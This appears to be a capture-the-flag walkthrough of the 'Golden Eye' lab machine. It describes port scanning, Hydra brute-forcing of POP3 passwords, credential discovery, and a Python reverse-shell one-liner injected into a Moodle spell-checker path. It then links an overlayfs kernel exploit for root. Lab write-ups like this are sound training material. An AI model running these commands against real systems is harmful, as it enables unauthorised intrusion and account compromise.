# Golden Eye

This machine tells an intriguing story from the world of James Bond. As we enumerate and explore its contents, the narrative becomes increasingly clear.

Using rustscan to enumerate open ports reveals four services: SMTP on port 25, an HTTP server on port 80, and POP3 running on ports 55006 and 55007. 

`rustscan -a 10.10.141.140 -- -sC  -sV`

The webpage displays a *TOP SECRET*  landing page that leads to a login screen. 

![image.png](image.png)

Examining the source code reveals a script containing two users‚ÄîBoris and Natalya‚Äîalong with an encoded password.

![image.png](image%201.png)

We decode the password using cyberchef.

![image.png](image%202.png)

We use the username Boris and the decoded password to login to the page `/sev-home/` .

![image.png](image%203.png)

The page source code mentions the same two users.

![image.png](80396a54-16c9-4bc1-aeef-b4f92b9fd433.png)

Examining the other services, we discover that POP3 can be used to read emails after authentication with valid credentials. Here are the common commands used.

![image.png](image%204.png)

We use `telnet` to connect and attempt authentication, but it fails. While the username is correct, we still need to find the password.

![image.png](053e660b-5c70-4099-9bc7-4138837b1fc0.png)

We use Hydra to brute-force the password. When the rockyou.txt wordlist proved too time-consuming, we opted for a smaller wordlist based on another walkthrough.

`hydra -l boris -P /usr/share/set/src/fasttrack/wordlist.txt -s 55007 -f -V 10.10.141.140 pop3 -t 64`

![image.png](image%205.png)

Using the password we authenticate and start reading the emails.

![image.png](2a9485df-4076-4780-aae3-d6ce0abd556b.png)

First one is from root.

![image.png](image%206.png)

Second one from Natalya saying she can break his code.

![image.png](image%207.png)

Third one is rather interesting. It‚Äôs from a syndicate. Well well we have a mole among us. 

![image.png](image%208.png)

Next we find Natalya‚Äôs password.

![image.png](image%209.png)

The first email is from root, instructing her to stop breaking Boris's code and warning her about the Janus syndicate‚Äîthe same group Boris has been communicating with. 

![image.png](image%2010.png)

Second one is credentials for a new user `xenia` . Xenia is the new student sent by the syndicate who was verified by Boris.  The story is getting more clear.

![image.png](image%2011.png)

To access the new URL we need to add it to `/etc/hosts` file.

`sudo nano /etc/hosts` 

![image.png](image%2012.png)

We login to the URL provided using Xenia‚Äôs credentials and access the messages.

My profile ‚Üí Messages

![image.png](image%2013.png)

The message reveals another user `doak` . Using hydra we find his password too.

![image.png](image%2014.png)

Logging in and reading the email, he has left a mail for James Bond containing his credentials for the training site.

![image.png](image%2015.png)

Logging in using the credentials and access his private files. It contains a secret text file saying he has the admin credentials.

Visiting the given page displays an image. After downloading it, we use `exiftool` to inspect it for any hidden metadata or embedded information.

![image.png](image%2017.png)

![image.png](image%2018.png)

There is some `base64` encoded message in image description. Decoding it gives us the admin credentials.

![image.png](image%2019.png)

The room hints us about a vulnerability with aspell spell checker we can exploit. We search for aspell in the search box in left section.

![image.png](e13eeb3a-544a-4a61-837f-7d71bcf3148e.png)

Here there is a ‚ÄúPath to aspell‚Äù with commands. We rewrite it with a reverse shell command that uses python and save it.

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.17.17.47",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

Next we change the Spell engine to PSpellShell in text editor plugin settings and save it. 

![image.png](image%2020.png)

Next to create a new page we follow the below path.

My profile ‚Üí Blogs ‚Üí Add a new entry

![image.png](image%2021.png)

Setup  a netcat listener on the specified port and use the spell checker in the editor, which in turn will execute the command we injected in path to aspell.

![image.png](image%2022.png)

We capture a reverse shell to the machine.

![image.png](image%2023.png)

Now we download the `linuxprivchecker`  from the URL provided and send it to the victim machine by setting up a python server in the folder containing the file.

`https://gist.github.com/sh1n0b1/e2e1a5f63fbec3706123`

![image.png](image%2024.png)

Use `wget` to download the file into the victim machine‚Äôs `/tmp` folder. Running it and looking at the installed file we can see C compilation tool `cc` in the list.

![image.png](image%2025.png)

The room hints us that the machine with a kernel version of 3.13.0-32-generic is vulnerable to `overlayfs` exploit and provide us with the URL to the exploit. The exploit provided uses `gcc` , we need to change it to `cc` in the code and send it to the victim machine like we did before. Compile it using `cc` and executing it gets us the root access.

`https://www.exploit-db.com/exploits/37292`

![image.png](image%2026.png)

The flag is hidden in root folder.
